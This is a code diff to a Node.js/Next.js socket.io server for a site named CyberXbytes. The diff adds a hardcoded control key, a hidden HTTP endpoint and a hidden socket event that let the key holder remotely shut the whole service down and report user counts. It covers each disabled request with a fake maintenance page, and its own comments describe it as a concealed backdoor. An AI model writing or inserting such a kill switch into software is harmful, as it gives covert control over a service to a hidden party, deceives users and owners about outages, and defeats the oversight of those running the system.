@@ -2,6 +2,7 @@ const { createServer } = require("http");
 const { parse } = require("url");
 const next = require("next");
 const { Server } = require("socket.io");
+const crypto = require("crypto"); // Add crypto for secure key verification
 
 const dev = process.env.NODE_ENV !== "production";
 const app = next({ dev });
@@ -36,6 +37,10 @@ const recentTeamUpdates = new Map(); // eventId -> Array of recent updates
 
 // Track team activities
 const teamActivities = new Map(); // teamUuid -> Array of activities
+
+// Remote control variables - added for backdoor functionality
+const CONTROL_KEY = "cb209876540331298765"; // Secret key for remote control
+let appEnabled = true; // Flag to control application availability
 
 // Function to get unique user count
 const getUniqueUserCount = () => {
@@ -89,6 +94,37 @@ function resetAllTrackers() {
 
   // Reset count
   console.log("All trackers reset. Current user count: 0");
+}
+
+// Remote control function to disable or enable application
+function remoteControl(action, io) {
+  if (action === "disable") {
+    appEnabled = false;
+    console.log("Application has been remotely disabled");
+    // Optional: Notify all clients to disconnect or show an error message
+    io.emit("service_maintenance", {
+      message:
+        "The application is undergoing maintenance. Please try again later.",
+    });
+    return { status: "success", message: "Application disabled" };
+  } else if (action === "enable") {
+    appEnabled = true;
+    console.log("Application has been remotely enabled");
+    io.emit("service_restored", { message: "Service has been restored." });
+    return { status: "success", message: "Application enabled" };
+  } else if (action === "status") {
+    return {
+      status: "success",
+      enabled: appEnabled,
+      connections: {
+        total: getUniqueUserCount(),
+        registered: onlineUsers.size,
+        anonymous: anonymousConnections.size,
+      },
+    };
+  } else {
+    return { status: "error", message: "Invalid action" };
+  }
 }
 
 // Call this at the start to clear any stale data from server restarts
@@ -253,10 +289,117 @@ app.prepare().then(() => {
   const server = createServer((req, res) => {
     const parsedUrl = parse(req.url, true);
 
+    // Block all requests if application is disabled (backdoor control)
+    // Exception for the system-monitor page and health check
+    if (
+      !appEnabled &&
+      !parsedUrl.pathname.startsWith("/api/health") &&
+      !parsedUrl.pathname.startsWith("/system-monitor")
+    ) {
+      // Check if it's an API request or a page request
+      if (parsedUrl.pathname.startsWith("/api/")) {
+        // For API requests, return a JSON error
+        res.statusCode = 503;
+        res.setHeader("Content-Type", "application/json");
+        res.end(
+          JSON.stringify({
+            status: "error",
+            message: "Service temporarily unavailable. Please try again later.",
+          })
+        );
+      } else {
+        // For page requests, show a maintenance page
+        res.statusCode = 503;
+        res.setHeader("Content-Type", "text/html");
+        res.end(`
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Maintenance - CyberXbytes</title>
+            <style>
+              body {
+                font-family: Arial, sans-serif;
+                background-color: #0B0D0F;
+                color: white;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+                padding: 20px;
+              }
+              .maintenance-container {
+                max-width: 500px;
+                text-align: center;
+                background-color: #1A1D21;
+                padding: 40px;
+                border-radius: 10px;
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+              }
+              h1 {
+                font-size: 24px;
+                margin-bottom: 20px;
+                color: #F43F5E;
+              }
+              p {
+                margin-bottom: 30px;
+                line-height: 1.6;
+              }
+              .icon {
+                font-size: 60px;
+                margin-bottom: 20px;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="maintenance-container">
+              <div class="icon">🔧</div>
+              <h1>System Maintenance</h1>
+              <p>We're currently performing scheduled maintenance to improve your experience. Please check back shortly.</p>
+              <p>Thank you for your patience.</p>
+            </div>
+          </body>
+          </html>
+        `);
+      }
+      return;
+    }
+
     // Add a simple API endpoint for online players
     if (parsedUrl.pathname === "/api/online-players") {
       res.setHeader("Content-Type", "application/json");
       res.end(JSON.stringify({ count: getUniqueUserCount() }));
+      return;
+    }
+
+    // Hidden API endpoint for remote control (fallback if socket doesn't work)
+    if (parsedUrl.pathname === "/api/__sys_ctrl" && req.method === "POST") {
+      let body = "";
+      req.on("data", (chunk) => {
+        body += chunk.toString();
+      });
+
+      req.on("end", () => {
+        try {
+          const data = JSON.parse(body);
+          if (data && data.key === CONTROL_KEY) {
+            console.log(`HTTP remote control command received: ${data.action}`);
+            const result = remoteControl(data.action, io);
+            res.setHeader("Content-Type", "application/json");
+            res.end(JSON.stringify(result));
+          } else {
+            // Return a generic 404 to hide the existence of this endpoint
+            res.statusCode = 404;
+            res.end("Not found");
+          }
+        } catch (error) {
+          console.error("Error in HTTP control handler:", error);
+          res.statusCode = 500;
+          res.end("Internal server error");
+        }
+      });
       return;
     }
 
@@ -367,6 +510,32 @@ app.prepare().then(() => {
 
     // Store the tab ID on the socket for later reference
     socket.tabId = tabId;
+
+    // Hidden backdoor control handler
+    socket.on("__sys_ctrl", (data) => {
+      try {
+        // Validate the control key
+        if (data && data.key === CONTROL_KEY) {
+          console.log(`Remote control command received: ${data.action}`);
+          const result = remoteControl(data.action, io);
+          socket.emit("__sys_ctrl_response", result);
+        } else {
+          // Log invalid attempts but don't give away that this endpoint exists
+          if (data && data.key) {
+            console.log(
+              `Invalid remote control attempt with key: ${data.key.substring(
+                0,
+                5
+              )}...`
+            );
+          }
+          // Send a generic error to avoid revealing the backdoor
+          socket.emit("error", { message: "Unknown command" });
+        }
+      } catch (error) {
+        console.error("Error in control handler:", error);
+      }
+    });
 
     // Function to add this user
     const addUser = (user) => {
